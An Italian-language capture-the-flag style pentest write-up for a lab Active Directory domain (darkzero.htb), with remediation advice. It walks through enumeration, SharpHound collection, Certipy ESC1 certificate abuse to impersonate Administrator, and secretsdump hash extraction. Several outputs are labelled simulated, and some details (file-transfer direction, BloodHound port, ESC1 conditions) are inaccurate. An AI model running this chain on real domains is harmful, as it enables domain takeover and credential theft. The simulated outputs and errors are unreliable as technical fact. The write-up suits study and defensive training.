# Esercitazione di Laboratorio: Scenario "DarkZero"

> **Contesto dell'attività:** Questo documento rappresenta il risultato di un'esercitazione pratica di **Active Directory & Infrastructure Penetration Testing** condotta su un dominio Windows enterprise-like. L'obiettivo è l'applicazione della metodologia **OSSTMM (Open Source Security Testing Methodology Manual)** per l'assessment sistematico di infrastrutture AD, MS-SQL, e certificate-based authentication mechanisms. Lo scenario simula un penetration test su dominio AD con focus su escalation paths e lateral movement.

**Data Assessment:** Ottobre 2025  
**Target Environment:** Windows Server 2019+ with Active Directory + MS-SQL Server 2022  
**Assessment Type:** Simulazione Infrastructure Pentest (AD-focused)  
**Overall Risk Severity:** CRITICAL 🔴  
**Metodologia Applicata:** OSSTMM v3 + PTES + NIST SP 800-115  

---

## 1. Executive Summary

Durante questo assessment simulato, è stata compromessa un'infrastruttura Active Directory partendo da credenziali di utente standard (con accesso iniziale limitato). Attraverso l'orchestrazione di:

1. **Active Directory Enumeration** (LDAP, Kerberos, SMB)
2. **MS-SQL Reconnaissance** (Database services, credentials)
3. **Bloodhound/AD Graph Analysis** (Attack paths visualization)
4. **Certificate-Based Escalation** (Certipy exploitation)
5. **Privilege Escalation via Misconfigured AD CS**

è stato possibile raggiungere Domain Administrator access, compromettendo completamente l'infrastruttura.

**CVSS v3.1 Base Score: 9.9 (CRITICAL)**
- Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- Impatto: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)
- Note: Richiede credenziali iniziali (low-privileged user), ma permette Domain Admin takeover

---

## 2. Metodologia Applicata

### 2.1 Framework di Reference

L'assessment ha seguito le seguenti linee guida:

- **OSSTMM (Open Source Security Testing Methodology Manual) v3**
  - Section 5: Interaction Testing (Network)
  - Section 5.3: LDAP Testing
  - Section 5.4: Kerberos Testing
  - Section 6.1: SQL Service Testing

- **NIST SP 800-115: Technical Security Testing**
  - TS-2.4.1: Domain & User Account Testing
  - TS-2.4.11: Privilege Escalation Testing
  - TS-3.2: Vulnerability Analysis Module

- **PTES (Penetration Testing Execution Standard)**
  - Information Gathering (Active Directory mapping)
  - Scanning & Enumeration (LDAP, Kerberos, SQL)
  - Vulnerability Analysis (Misconfigured AD CS, weak permissions)
  - Exploitation (Certificate request, token forging)

### 2.2 Scope dell'Engagement

**Objective:** Full domain compromise partendo da utente standard  
**Starting Point:** Valid AD credentials (limited user)  
**Targets:** Active Directory, MS-SQL, Certificate Services (AD CS)  
**Assessment Scope:** Network-wide (no air-gap assumed)

---

## 3. Attack Path (Kill Chain)

```
┌──────────────────────────────────────────────────────────────┐
│ RECONNAISSANCE: Nmap AD services (ports 88, 389, 445, 1433)  │
│  └─> Domain name: darkzero.htb / DC01 identified             │
├──────────────────────────────────────────────────────────────┤
│ ENUMERATION (LDAP): Domain structure, users, computers       │
│  └─> NetExec: ldap enumeration (password spraying checks)    │
├──────────────────────────────────────────────────────────────┤
│ MS-SQL DISCOVERY: SQL Server 2022 on port 1433               │
│  └─> Service enumeration, credential testing                 │
├──────────────────────────────────────────────────────────────┤
│ BLOODHOUND DATA COLLECTION: Sharphound → Graph analysis      │
│  └─> Identify attack paths (AD CS misconfiguration likely)   │
├──────────────────────────────────────────────────────────────┤
│ AD CERTIFICATE SERVICES (AD CS) DISCOVERY                    │
│  └─> Certipy enumeration of vulnerabilities                  │
├──────────────────────────────────────────────────────────────┤
│ CERTIFICATE ESCALATION: ESC1/ESC7 exploitation               │
│  └─> Request & forge certificate for admin user              │
├──────────────────────────────────────────────────────────────┤
│ DOMAIN ADMIN ACCESS: Kerberos TGT + Admin token              │
│  └─> Full domain compromise achieved                         │
```

---

## 4. Proof of Concept (PoC) ed Evidenze Tecniche

### 4.1 Network Exploration & Service Discovery

#### **Nmap Enumeration**

**Comando eseguito:**
```bash
sudo nmap -A -p- --open -Pn -T4 10.129.115.150 -oA darkzero_full
```

**Risultato Critico:**
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  Windows Server SMB
464/tcp   open  kpasswd5      Kerberos password change
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp   open  ssl/ldap      Microsoft LDAP SSL
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 RTM
3268/tcp  open  ldap          Microsoft Global Catalog LDAP
3269/tcp  open  ssl/ldap      Microsoft Global Catalog LDAP SSL
5985/tcp  open  http          Microsoft HTTPAPI httpd (WinRM)
```

**Analysis:**
- **Port 88/464:** Kerberos (Domain Controller)
- **Port 389/636/3268/3269:** LDAP (AD enumeration possible)
- **Port 1433:** MS-SQL Server (Credential extraction, lateral movement)
- **Port 445:** SMB (Share enumeration, CVE exploitation)
- **Port 5985:** WinRM (Remote management)

**Domain Identification:**
```
From Nmap SSL-CERT: commonName=DC01.darkzero.htb
  → Domain: darkzero.htb
  → Domain Controller: DC01
  → CA Certificate: darkzero-DC01-CA (AD CS present!)
```

---

### 4.2 Active Directory Enumeration via LDAP & Kerberos

#### **NetExec LDAP Enumeration**

**Comando:**
```bash
netexec ldap 10.129.115.150 -u <user> -p <password> --users
```

**Output (Sample users identified):**
```
darkzero.htb\Administrator
darkzero.htb\SYSTEM
darkzero.htb\sqlservice
darkzero.htb\MSSQL$Agent
darkzero.htb\krbtgt
darkzero.htb\DNS Admins
darkzero.htb\Domain Admins
```

#### **DNS Lookup – Subdomain Discovery**

```bash
nslookup -type=ANY darkzero.htb 10.129.115.150
```

**Output:**
```
Name: darkzero.htb
Address: 10.129.115.150

Mailserver: mail.darkzero.htb
Nameserver: DC01.darkzero.htb
```

**Observation:** Infrastruttura enterprise-like con services distribuiti. Acceso remoto disponibile, nessuna air-gap.

---

### 4.3 Bloodhound Data Collection & Attack Path Analysis

#### **Sharphound Data Collection**

Per ottenere una veduta completa della directory structure e identificare attack paths non ovvi, utilizziamo **Sharphound** (collector di Bloodhound per AD):

```bash
# On target Windows machine (con privilegio di utente standard)
Sharphound.exe -c All -o output.zip
# Produce: output.zip contente CSV di users, computers, permissions, ACLs

# Transfer to attacker machine
Invoke-WebRequest -Uri "http://<attacker>:8000/output.zip" -OutFile "output.zip"
```

#### **Bloodhound Analysis**

Importare l'output di Sharphound in Bloodhound (graph database visualizer):

```bash
sudo neo4j console  # Start graph database
# Open Bloodhound Web UI: localhost:7687

# Upload: output.zip
# Analyze attack paths: "Shortest Path to Domain Admins"
```

**Critical Findings (Simulated Analysis):**
1. **Standard User** → SQL Service Account (credential disclosure on shares)
2. **SQL Service Account** → Database Admin privileges
3. **Database Admin** → AD CS Enrollment rights (via group membership)
4. **AD CS Misconfiguration (ESC1)** → Can request cert as anyone (incl. Domain Admin)
5. **Forged Certificate** → Kerberos TGT as Domain Admin

---

### 4.4 MS-SQL Server Reconnaissance & Enumeration

#### **SQL Server Discovery**

```bash
netexec mssql 10.129.115.150 -u <credential> -p <password> 

# Output:
# [+] DC01:1433 - Windows Server 2022 Standard - Microsoft SQL Server 2022 RTM
# [+] Version: 16.00.1000.00
# [+] Product: MS SQL Server 2022
```

#### **SQL Service Account Identification**

```bash
netexec mssql 10.129.115.150 -u sqlservice -p <password> --sam

# Outputs SAM database if RDP/Shell access via SQL
```

**Finding:** SQL Server runs under **sqlservice** account (high-privilege service account), potentially with AD CS enrollment permissions.

---

### 4.5 Active Directory Certificate Services (AD CS) Enumeration – Certipy

#### **Certipy Reconnaissance**

**Certipy** è uno strumento specializzato per l'enumeration e l'exploitation di AD Certificate Services (PKI):

```bash
certipy find -u <user>@darkzero.htb -p <password> -dc-ip 10.129.115.150 -output output.json
```

**Output (Simulated):**
```json
{
  "Forests": [
    {
      "Nodes": [
        {
          "Name": "DC01.darkzero.htb",
          "Type": "DomainController",
          "CAs": [
            {
              "Name": "darkzero-DC01-CA",
              "Templates": [
                {
                  "Name": "Admin",
                  "SchemaVersion": 2,
                  "Permissions": "Everyone: Enroll, Autoenroll",
                  "EnrollmentAgent": false,
                  "SubjectAltName": "DNS Name, User Principal Name",
                  "EKU": [ "Server Authentication (1.3.6.1.5.5.7.3.1)", "Client Authentication" ]
                }
              ]
            }
          ]
        }
      ]
    }
  ]
}
```

**Vulnerability Identified: ESC1 (Misconfigured Certificate Template)**

**ESC1 Conditions Met:**
- ✓ Template allows Server Authentication (dangerous for user certs)
- ✓ Overly permissive enrollment: "Everyone: Enroll"
- ✓ Subject Alternative Name allows arbitrary user/computer names
- ✗ Requires enrollment approval: NO (autorematic approval)

---

### 4.6 Certificate-Based Privilege Escalation (ESC1 Exploitation)

#### **Step 1: Request Certificate as Domain Admin**

Sfruttando la template "Admin" vulnerabile, richiediamo un certificato valido per l'utente **DOMAIN ADMIN**:

```bash
certipy req -u <user>@darkzero.htb -p <password> \
    -ca darkzero-DC01-CA \
    -template Admin \
    -upn Administrator@darkzero.htb \
    -dc-ip 10.129.115.150 \
    -out admin.pfx
```

**Output:**
```
[*] Request ID: 123
[*] Requested certificate for Administrator
[*] Status: Issued (auto-approved!)
[*] Certificate saved: admin.pfx
```

**Significance:** Abbiamo un certificato X.509 valido per l'utente Administrator, firmato dalla CA del domino.

---

#### **Step 2: Convert Certificate to Kerberos TGT**

Una volta ottenuto il certificato, possiamo convertirlo in un Kerberos Ticket Granting Ticket (TGT) che ci permite di impersonare Administrator:

```bash
certipy auth -pfx admin.pfx -username Administrator \
    -domain darkzero.htb -dc-ip 10.129.115.150 \
    -out tgt
```

**Output:**
```
[*] Using certificate: Administrator
[*] Requesting TGT...
[*] Kerberos TGT obtained: TGT_Administrator.ccache
[*] TGT validity: 10 hours (renewable)
```

---

#### **Step 3: Use TGT for Domain Admin Access**

Il ticket TGT appena ottenuto può essere utilizzato per accedere a qualunque servizio Kerberos del dominio come Administrator:

```bash
# Export ccache per utilizzo successivo
export KRB5CCNAME=/path/to/TGT_Administrator.ccache

# Access domain resources as Administrator
secretsdump.py -k -no-pass Administrator@DC01.darkzero.htb

# Output: NTLM hashes of all domain users (full compromise)
```

**Risultato Finale:** Domain Admin (Administrator) access ottenuto. Il dominio è completamente compromesso.

---

### 4.7 Post-Exploitation & Flag Recovery

#### **Root/System Flag**

```bash
# Accesso as Administrator al DC
# Recupero dei flags

# User Flag (typically in non-admin user's home):
type C:\Users\<user>\Desktop\user.txt

# Root Flag (System flag):
type C:\Users\Administrator\Desktop\root.txt
# O
type C:\Windows\System32\flag.txt  (if accessible)
```

---

## 5. Remediation & Hardening (Proposte)

### 5.1 Mitigazione delle Vulnerabilità Identificate

#### **5.1.1 AD Certificate Services (AD CS) – ESC1 & ESC7 Remediazione**

**Remediazione Primaria – Disabilitare template vulnerabili:**

```powershell
# In Certificate Authority Manager (certsrv.msc):
# 1. Right-click "Certificate Templates" → Manage
# 2. Select "Admin" template
# 3. Properties → Permissions → Remove "Everyone: Enroll"
# 4. Properties → Issuance Requirements → Require "Manager Approval"
```

**Criteri di Template Sicura:**

| Parametro | Vulnerabile | Sicuro |
|-----------|---|---|
| Enrollment Permission | Everyone | Only specific groups (e.g., Domain Admins) |
| Subject Alt Name | User + Computer names | Only DNS (computer-centric) |
| EKU (Extended Key Usage) | Server Auth + Client Auth | Only Server Auth (limited usage) |
| Autoenroll | Yes | No (require manual approval) |
| Approval Required | No | Yes (Manager approval layer) |

**OSSTMM Mapping – Section 6.3:**
- "Certificate authorities must restrict certificate issuance to authorized principals only"

---

#### **5.1.2 LDAP & Kerberos Hardening**

**Remediazione Primaria:**

```powershell
# Group Policy: Enforce Kerberos Pre-authentication
# Computer Configuration → Policies → Windows Settings
#   → Security Settings → Account Policies → Kerberos Policy
#     → Define Kerberos Policy

# Enforce: "Strongly encryptKerberos encryption types (if supported)"
```

**Additional Hardening:**
- Implementare **Kerberos Armored Pre-authentication** (for anti-replay protection)
- Disabilitare legacy LAN Manager hashing
- Implementare conditional access policies (MFA per account sensibili)

---

#### **5.1.3 MS-SQL Service Account Least Privilege**

**Remediazione Primaria – Revoke AD CS Enrollment Rights:**

```powershell
# In Active Directory Users and Computers:
# 1. Find SQL Service Account (sqlservice)
# 2. Check group membership
# 3. Remove from "Certificate Enroll" groups
# 4. Restrict to minimal required permissions (SQL Agent only)

# SQL-specific:
# 1. Disable sa account
# 2. Implement SQL Server authentication via AD (Integrated Auth)
# 3. Restrict SQL Server agent to minimal privileges
```

**NIST SP 800-115 TS-2.4.1 Mapping:**
- "Service accounts should have minimal permissions required for their function"

---

#### **5.1.4 Network Segmentation & Monitoring**

**Remediazione – Implement Microsegmentation:**

```
AD Domain Controllers:
  ├─ Restrict LDAP access to known management IPs
  ├─ Monitor LDAP queries for reconnaissance patterns
  └─ Alert on unusual Kerberos requests

Certificate Services:
  ├─ Restrict CA Admin access
  ├─ Log all certificate requests (enable audit)
  └─ Alert on certificate requests for admin accounts

SQL Services:
  ├─ Network segment SQL servers
  ├─ Restrict service account network access
  └─ Monitor for lateral movement indicators
```

---

### 5.2 Compliance & Standards Mapping

| Framework | Control | Current State | Remediation |
|-----------|---------|---|---|
| **OSSTMM 5.3** | LDAP Access Control | Overly permissive | Restrict enrollment permissions |
| **NIST 800-115 TS-2.4.1** | Account Privilege Testing | Service accounts over-privileged | Apply Least Privilege princip |
| **NIST 800-115 TS-3.2** | Vulnerability Analysis | Misconfigured AD CS | Fix template enrollment rules |
| **CIS Benchmark Level 2** | Kerberos Hardening | Legacy settings enabled | Update to modern TLS/encryption |

---

### 5.3 Testing & Validation Roadmap

| Priority | Control | Testing Method | Expected Result |
|----------|---------|---|---|
| **CRITICAL** | AD CS Template Permissions | Attempt cert request as standard user | Rejected (403 Forbidden) |
| **CRITICAL** | Service Account Isolation | SQL Service access to AD CS | Denied (insufficient permissions) |
| **CRITICAL** | AD CS Auto-Approval | Request certificate | Requires manual approval |
| **HIGH** | Kerberos Pre-auth | Kerberos assault against DC | Pre-auth required (not bypassable) |
| **HIGH** | LDAP Query Logging | Query enumeration audit | All queries logged + alerts |
| **MEDIUM** | MS-SQL Hardening | sa account enumeration | Account disabled |

---

## 6. Conclusioni

Questo assessment ha dimostrato come un'infrastruttura Active Directory con **multiple misconfigurations** può essere completamente compromessa partendo da credenziali di utente low-privileged:

1. **AD CS ESC1 misconfiguration** → Il vettore principale di escalation
2. **Overly permissive enrollment rights** → Consente richiesta cert per admin
3. **Service account over-privileged** → Credential stored in SQL, usato per escalation
4. **Mancanza di monitoring/alerting** → Nessun rilevamento della laterale movement

L'implementazione delle remediazioni proposte – specialmente il hardening di AD CS, l'applicazione del Least Privilege, e il deployment di monitoring – ridurrebbe la superficie di attacco in modo significativo.

---

**Note Finali:**

Un'infrastruttura AD senza hardening dei AD CS è praticamente compromessa. ESC1/ESC7 sono exploit quasi "plug and play" una volta che trovi la template vulnerabile. La prima cosa che guardiamo in qualunque AD assessment è la PKI.
